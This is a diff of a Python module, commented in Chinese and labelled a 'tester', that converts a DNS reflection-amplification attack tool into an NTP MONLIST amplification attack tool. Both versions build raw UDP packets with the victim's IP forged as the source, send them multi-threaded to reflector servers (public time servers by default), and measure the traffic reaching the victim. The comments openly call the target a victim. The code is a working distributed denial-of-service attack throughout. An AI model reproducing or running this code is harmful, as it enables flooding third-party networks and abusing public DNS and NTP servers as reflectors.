@@ -6,25 +6,23 @@ import threading
 import random
 import logging
 import traceback
-import select
 from threading import Lock
 from typing import List, Dict, Optional, Callable, Any
-from datetime import datetime, timedelta
 
 # 创建日志记录器
 logger = logging.getLogger(__name__)
 
 
-class SmartServerManager:
-    """智能服务器管理器"""
+class NTPServerManager:
+    """NTP服务器管理器"""
     
     def __init__(self, servers):
         self.servers = servers
         self.server_stats = {}
         for server in servers:
             self.server_stats[server] = {
-                'success': 0, 
-                'total': 0, 
+                'success': 0,
+                'total': 0,
                 'score': 0.5
             }
         self.last_update = time.time()
@@ -64,8 +62,8 @@ class SmartServerManager:
         """更新服务器统计信息"""
         if server not in self.server_stats:
             self.server_stats[server] = {
-                'success': 0, 
-                'total': 0, 
+                'success': 0,
+                'total': 0,
                 'score': 0.5
             }
         
@@ -76,7 +74,7 @@ class SmartServerManager:
         # 更新得分
         if self.server_stats[server]['total'] > 0:
             success_rate = (
-                self.server_stats[server]['success'] / 
+                self.server_stats[server]['success'] /
                 self.server_stats[server]['total']
             )
             self.server_stats[server]['score'] = success_rate
@@ -91,8 +89,8 @@ class SmartServerManager:
                 stats['total'] = int(stats['total'] * 0.8)
 
 
-class DNSTester:
-    """DNS反射放大攻击测试器"""
+class NTPTester:
+    """NTP放大攻击测试器"""
     
     def __init__(self):
         self.is_running = False
@@ -113,9 +111,9 @@ class DNSTester:
             'progress_percent': 0
         }
         
-        # DNS服务器配置
-        self.servers_file = 'servers/dns.txt'
-        self.dns_servers = []
+        # NTP服务器配置
+        self.servers_file = 'attack_resources/ntp/resources/servers.txt'
+        self.ntp_servers = []
         
         # 远程监控信息
         self.remote_recv_mbps = 0.0
@@ -126,22 +124,14 @@ class DNSTester:
         self.start_time = 0
         self.end_time = 0
         
-        # DNS配置
-        self.dns_query_type = 'TXT'
-        self.use_dnssec = True
-        self.query_name = "ripe.net"
-        
-        # DNS类型映射
-        self.dns_type_map = {
-            "TXT": 16,
-            "ANY": 255,
-            "DNSKEY": 48,
-            "RRSIG": 46
-        }
+        # NTP配置
+        self.ntp_port = 123
+        self.monlist_packet_size = 468  # MONLIST请求包大小
+        self.expected_amplification = 556  # NTP MONLIST典型放大倍数
         
         # 服务器管理器
         self.server_manager = None
-
+    
     def run_test(self, target_ip: str, target_port: int = 80,
                  duration_minutes: int = 5, threads: int = 8,
                  spoof_source_ip: Optional[str] = None, spoof_source_port: int = 0,
@@ -154,7 +144,7 @@ class DNSTester:
         if spoof_source_port == 0:
             spoof_source_port = target_port
         
-        logger.info(f"开始DNS测试")
+        logger.info(f"开始NTP测试")
         logger.info(f"受害者: {target_ip}:{target_port}")
         logger.info(f"伪造源: {spoof_source_ip}:{spoof_source_port}")
         
@@ -164,23 +154,22 @@ class DNSTester:
         self.end_time = self.start_time + (duration_minutes * 60)
         
         try:
-            # 加载DNS反射服务器列表
-            dns_servers = self._load_servers()
-            if not dns_servers:
-                logger.error("没有可用的DNS服务器")
+            # 加载NTP反射服务器列表
+            ntp_servers = self._load_servers()
+            if not ntp_servers:
+                logger.error("没有可用的NTP服务器")
                 return
             
-            logger.info(f"加载了 {len(dns_servers)} 个DNS服务器")
+            logger.info(f"加载了 {len(ntp_servers)} 个NTP服务器")
             
             # 初始化服务器管理器
-            self.server_manager = SmartServerManager(dns_servers)
+            self.server_manager = NTPServerManager(ntp_servers)
             
             # 优化系统设置
             self._optimize_system()
             
-            # 构建DNS查询数据
-            query_type = self.dns_type_map.get(self.dns_query_type, 16)  # 默认TXT
-            dns_query_data = self._build_dns_query(query_type)
+            # 构建NTP MONLIST请求包
+            ntp_data = self._build_ntp_monlist_packet()
             
             # 创建原始套接字（需要root权限）
             try:
@@ -217,8 +206,7 @@ class DNSTester:
                         sock,
                         spoof_source_ip,  # 伪造的源IP（受害者IP）
                         spoof_source_port, # 伪造的源端口（受害者端口）
-                        dns_query_data,
-                        query_type,
+                        ntp_data,
                         self.end_time,
                         target_pps_per_thread
                     )
@@ -241,7 +229,7 @@ class DNSTester:
                 if t.is_alive():
                     t.join(timeout=2)
             
-            logger.info("DNS测试完成")
+            logger.info("NTP测试完成")
             
             # 发送最终统计
             if self.stats_callback:
@@ -249,12 +237,13 @@ class DNSTester:
                 final_stats.update({
                     'victim_mbps': self.remote_recv_mbps,
                     'max_amplification_factor': self.max_amplification_factor,
-                    'progress_percent': 100
+                    'progress_percent': 100,
+                    'expected_amplification': self.expected_amplification
                 })
                 self.stats_callback(final_stats)
             
         except Exception as e:
-            logger.error(f"DNS测试执行错误: {str(e)}\n{traceback.format_exc()}")
+            logger.error(f"NTP测试执行错误: {str(e)}\n{traceback.format_exc()}")
             if self.stats_callback:
                 self.stats_callback({'error_message': str(e)})
         finally:
@@ -263,10 +252,10 @@ class DNSTester:
     def stop_test(self) -> None:
         """停止测试"""
         self.is_running = False
-        logger.info("正在停止DNS测试...")
+        logger.info("正在停止NTP测试...")
 
     def _load_servers(self) -> List[str]:
-        """加载DNS服务器列表"""
+        """加载NTP服务器列表"""
         servers = []
         
         if os.path.exists(self.servers_file):
@@ -275,16 +264,55 @@ class DNSTester:
                     for line in f:
                         line = line.strip()
                         if line and not line.startswith('#'):
-                            servers.append(line)
+                            # 如果是域名，解析为IP
+                            if not self._is_ip_address(line):
+                                try:
+                                    ip = socket.gethostbyname(line)
+                                    servers.append(ip)
+                                    logger.debug(f"解析域名 {line} -> {ip}")
+                                except socket.gaierror:
+                                    logger.warning(f"无法解析域名: {line}")
+                            else:
+                                servers.append(line)
             except Exception as e:
-                logger.error(f"加载DNS服务器列表失败: {str(e)}")
+                logger.error(f"加载NTP服务器列表失败: {str(e)}")
         else:
-            logger.warning(f"DNS服务器文件不存在: {self.servers_file}")
-            # 添加默认DNS服务器
-            default_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "8.8.4.4"]
-            servers.extend(default_servers)
+            logger.warning(f"NTP服务器文件不存在: {self.servers_file}")
+            # 添加默认NTP服务器
+            servers = self._get_default_ntp_servers()
             
         return servers
+
+    def _get_default_ntp_servers(self) -> List[str]:
+        """获取默认NTP服务器列表"""
+        default_servers = [
+            "pool.ntp.org",
+            "time.google.com",
+            "time.windows.com",
+            "time.apple.com",
+            "ntp1.aliyun.com",
+            "ntp2.aliyun.com",
+            "ntp3.aliyun.com"
+        ]
+        
+        servers = []
+        for server in default_servers:
+            try:
+                ip = socket.gethostbyname(server)
+                servers.append(ip)
+                logger.debug(f"解析默认NTP服务器 {server} -> {ip}")
+            except socket.gaierror:
+                logger.warning(f"无法解析默认NTP服务器: {server}")
+        
+        return servers
+
+    def _is_ip_address(self, address: str) -> bool:
+        """检查字符串是否为IP地址"""
+        try:
+            socket.inet_aton(address)
+            return True
+        except socket.error:
+            return False
 
     def _optimize_system(self):
         """优化系统设置"""
@@ -299,61 +327,28 @@ class DNSTester:
         except:
             logger.warning("系统优化失败")
 
-    def _build_dns_query(self, query_type_val: int) -> bytes:
-        """构建DNS查询数据"""
-        # DNS头部
-        transaction_id = random.randint(0, 65535)
-        flags = 0x0100  # 标准查询
-        questions = 1
-        answer_rrs = 0
-        authority_rrs = 0
-        additional_rrs = 1 if self.use_dnssec else 0
+    def _build_ntp_monlist_packet(self) -> bytes:
+        """构建NTP MONLIST请求包"""
+        # NTP MONLIST请求包结构
+        # LI=0 (无警告), VN=3 (版本3), Mode=7 (私有模式)
+        # Response=0 (请求), Error=0, More=0, Op=42 (MON_GETLIST)
         
-        dns_header = struct.pack(
-            '!HHHHHH',
-            transaction_id,
-            flags,
-            questions,
-            answer_rrs,
-            authority_rrs,
-            additional_rrs
-        )
+        # 构建NTP模式7头部（20字节）
+        ntp_header = bytearray([
+            0x17, 0x00, 0x03, 0x2A,  # LI=0, VN=3, Mode=7, REQ=0x2A (MON_GETLIST)
+            0x00, 0x00, 0x00, 0x00,  # Sequence
+            0x00, 0x00, 0x00, 0x00,  # Status
+            0x00, 0x00, 0x00, 0x00,  # Association ID
+            0x00, 0x00, 0x00, 0x00,  # Offset
+            0x00, 0x00, 0x00, 0x00,  # Count
+        ])
         
-        # DNS查询部分
-        qname_parts = self.query_name.split('.')
-        qname = b''
-        for part in qname_parts:
-            qname += struct.pack('B', len(part)) + part.encode()
-        qname += b'\x00'  # 结束
+        # 填充数据以达到468字节（某些NTP服务器要求的最小大小）
+        # 这有助于触发更大的响应
+        padding_size = self.monlist_packet_size - len(ntp_header)
+        ntp_header.extend(b'\x00' * padding_size)
         
-        qtype = struct.pack('!H', query_type_val)
-        qclass = struct.pack('!H', 1)  # IN class
-        
-        dns_query = qname + qtype + qclass
-        
-        # OPT记录（用于DNSSEC）
-        if self.use_dnssec:
-            opt_name = b'\x00'  # 根域名
-            opt_type = struct.pack('!H', 41)  # OPT
-            udp_payload_size = struct.pack('!H', 4096)  # 扩展UDP大小
-            extended_rcode = 0
-            edns_version = 0
-            z = 0x8000  # DNSSEC OK flag
-            opt_rdlen = struct.pack('!H', 0)  # 空RDATA
-            
-            opt_record = (
-                opt_name +
-                opt_type +
-                udp_payload_size +
-                struct.pack('!B', extended_rcode) +
-                struct.pack('!B', edns_version) +
-                struct.pack('!H', z) +
-                opt_rdlen
-            )
-            
-            return dns_header + dns_query + opt_record
-        else:
-            return dns_header + dns_query
+        return bytes(ntp_header)
 
     def _build_raw_packet(
         self,
@@ -361,13 +356,13 @@ class DNSTester:
         dst_ip: str,
         src_port: int,
         dst_port: int,
-        dns_query_data: bytes
+        ntp_data: bytes
     ) -> bytes:
         """构建原始IP/UDP数据包"""
         # IP头部
         ip_ver_ihl = 0x45  # IPv4, 头部长度5*4=20字节
         ip_tos = 0
-        ip_total_len = 20 + 8 + len(dns_query_data)  # IP + UDP + DNS
+        ip_total_len = 20 + 8 + len(ntp_data)  # IP + UDP + NTP
         ip_id = random.randint(0, 65535)
         ip_flags_frag = 0x4000  # Don't fragment
         ip_ttl = 64
@@ -393,14 +388,14 @@ class DNSTester:
         )
         
         # UDP头部
-        udp_src = src_port
+        udp_src = src_port or random.randint(1024, 65535)
         udp_dst = dst_port
-        udp_len = 8 + len(dns_query_data)
+        udp_len = 8 + len(ntp_data)
         udp_check = 0
         
         udp_header = struct.pack('!HHHH', udp_src, udp_dst, udp_len, udp_check)
         
-        return ip_header + udp_header + dns_query_data
+        return ip_header + udp_header + ntp_data
 
     def _send_worker(
         self,
@@ -408,13 +403,12 @@ class DNSTester:
         sock: socket.socket,
         src_ip: str,
         src_port: int,
-        dns_query_data: bytes,
-        query_type_val: int,
+        ntp_data: bytes,
         end_time: float,
         target_pps_per_thread: int
     ):
         """发送工作线程"""
-        logger.debug(f"DNS发送线程 {worker_id} 启动")
+        logger.debug(f"NTP发送线程 {worker_id} 启动")
         
         if not self.server_manager:
             logger.error(f"线程 {worker_id}: 服务器管理器未初始化")
@@ -423,7 +417,7 @@ class DNSTester:
         # 获取最佳服务器列表
         best_servers = self.server_manager.get_best_servers(30)
         if not best_servers:
-            logger.error(f"线程 {worker_id}: 没有可用的DNS服务器")
+            logger.error(f"线程 {worker_id}: 没有可用的NTP服务器")
             return
         
         packet_count = 0
@@ -454,8 +448,8 @@ class DNSTester:
                             src_ip=src_ip,
                             dst_ip=dst_ip,
                             src_port=src_port,
-                            dst_port=53,  # DNS服务器端口固定为53
-                            dns_query_data=dns_query_data
+                            dst_port=123,  # NTP服务器端口固定为123
+                            ntp_data=ntp_data
                         )
                         packet_cache[dst_ip] = packet_data
                     
@@ -484,8 +478,8 @@ class DNSTester:
                                         src_ip=src_ip,
                                         dst_ip=server,
                                         src_port=src_port,
-                                        dst_port=53,
-                                        dns_query_data=dns_query_data
+                                        dst_port=123,
+                                        ntp_data=ntp_data
                                     )
                 
                 # 更新统计
@@ -497,8 +491,8 @@ class DNSTester:
                 # 智能速率控制
                 batch_time = time.time() - batch_start
                 expected_batch_time = (
-                    batch_size / target_pps_per_thread 
-                    if target_pps_per_thread > 0 
+                    batch_size / target_pps_per_thread
+                    if target_pps_per_thread > 0
                     else 0.1
                 )
                 
@@ -519,14 +513,14 @@ class DNSTester:
                                 src_ip=src_ip,
                                 dst_ip=server,
                                 src_port=src_port,
-                                dst_port=53,
-                                dns_query_data=dns_query_data
+                                dst_port=123,
+                                ntp_data=ntp_data
                             )
         
         except Exception as e:
-            logger.error(f"DNS发送线程 {worker_id} 错误: {str(e)}\n{traceback.format_exc()}")
+            logger.error(f"NTP发送线程 {worker_id} 错误: {str(e)}\n{traceback.format_exc()}")
         
-        logger.debug(f"DNS发送线程 {worker_id} 结束，发送了 {packet_count} 个包")
+        logger.debug(f"NTP发送线程 {worker_id} 结束，发送了 {packet_count} 个包")
 
     def _feedback_listener(self):
         """反馈监听线程"""
@@ -536,9 +530,9 @@ class DNSTester:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.bind(('0.0.0.0', listen_port))
             sock.settimeout(2.0)  # 2秒超时
-            logger.info(f"反馈监听线程启动，端口 {listen_port}")
+            logger.info(f"NTP反馈监听线程启动，端口 {listen_port}")
         except Exception as e:
-            logger.error(f"无法启动反馈监听线程: {str(e)}")
+            logger.error(f"无法启动NTP反馈监听线程: {str(e)}")
             return
         
         while self.is_running:
@@ -560,11 +554,11 @@ class DNSTester:
                 pass
         
         sock.close()
-        logger.debug("反馈监听线程结束")
+        logger.debug("NTP反馈监听线程结束")
 
     def _stats_updater(self, end_time: float):
         """统计更新线程"""
-        logger.debug("DNS统计更新线程启动")
+        logger.debug("NTP统计更新线程启动")
         
         last_packets_sent = 0
         last_bytes_sent = 0
@@ -627,7 +621,8 @@ class DNSTester:
                                 'victim_mbps': victim_mbps,
                                 'is_data_fresh': is_data_fresh,
                                 'max_amplification_factor': self.max_amplification_factor,
-                                'progress_percent': progress_percent
+                                'progress_percent': progress_percent,
+                                'expected_amplification': self.expected_amplification
                             })
                             self.stats_callback(stats_copy)
                         
@@ -637,9 +632,9 @@ class DNSTester:
                         last_update_time = current_time
                 
             except Exception as e:
-                logger.error(f"DNS统计更新错误: {str(e)}")
+                logger.error(f"NTP统计更新错误: {str(e)}")
         
-        logger.debug("DNS统计更新线程结束")
+        logger.debug("NTP统计更新线程结束")
 
     def _get_local_ip(self) -> str:
         """获取本地IP地址"""
@@ -660,9 +655,14 @@ class DNSTester:
                 'remote_recv_mbps': self.remote_recv_mbps,
                 'remote_last_update': self.remote_last_update,
                 'max_amplification_factor': self.max_amplification_factor,
-                'is_data_fresh': (time.time() - self.remote_last_update) < 3.0
+                'is_data_fresh': (time.time() - self.remote_last_update) < 3.0,
+                'expected_amplification': self.expected_amplification
             })
             return stats_copy
+
+    def get_server_count(self) -> int:
+        """获取可用的NTP服务器数量"""
+        return len(self.ntp_servers) if self.ntp_servers else 0
 
     def cleanup(self) -> None:
         """清理资源"""
@@ -673,7 +673,7 @@ class DNSTester:
             if thread.is_alive():
                 thread.join(timeout=2)
         
-        logger.info("DNS测试资源清理完成")
+        logger.info("NTP测试资源清理完成")
 
 
 def main():
@@ -683,7 +683,7 @@ def main():
         format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
     )
     
-    tester = DNSTester()
+    tester = NTPTester()
     
     def print_stats(stats):
         """打印统计信息"""
@@ -698,22 +698,21 @@ def main():
     
     try:
         print("=" * 70)
-        print("DNS测试模块 - 单元测试")
+        print("NTP测试模块 - 单元测试")
         print("=" * 70)
-        print("协议: DNS放大攻击")
-        print("查询类型: TXT + DNSSEC")
-        print("查询域名: ripe.net")
+        print("协议: NTP MONLIST放大攻击")
         print("持续时间: 30秒")
         print("线程数: 2")
         print("目标PPS: 100")
+        print("请求包大小: 468字节")
+        print(f"预期放大倍数: {tester.expected_amplification}x")
         print("=" * 70)
         
         # 运行一个简短的测试
-        # 注意：这里使用伪造源IP，所以需要指定受害者IP和端口
         tester.run_test(
-            target_ip="8.8.8.8",  # 受害者IP
-            target_port=80,        # 受害者端口
-            duration_minutes=0.5,  # 30秒
+            target_ip="127.0.0.1",  # 受害者IP
+            target_port=80,         # 受害者端口
+            duration_minutes=0.5,   # 30秒
             threads=2,
             target_pps=100,
             spoof_source_ip="127.0.0.1",  # 伪造的源IP（受害者IP）
@@ -736,7 +735,14 @@ def main():
         
         if stats['max_amplification_factor'] > 0:
             print(f"最大放大倍数: {stats['max_amplification_factor']:.2f}x")
+            print(f"预期放大倍数: {stats['expected_amplification']}x")
+            efficiency = (
+                stats['max_amplification_factor'] /
+                stats['expected_amplification'] * 100
+            )
+            print(f"效率: {efficiency:.1f}%")
         
+        print(f"可用服务器数: {tester.get_server_count()}")
         print("=" * 70)
         
     except KeyboardInterrupt:
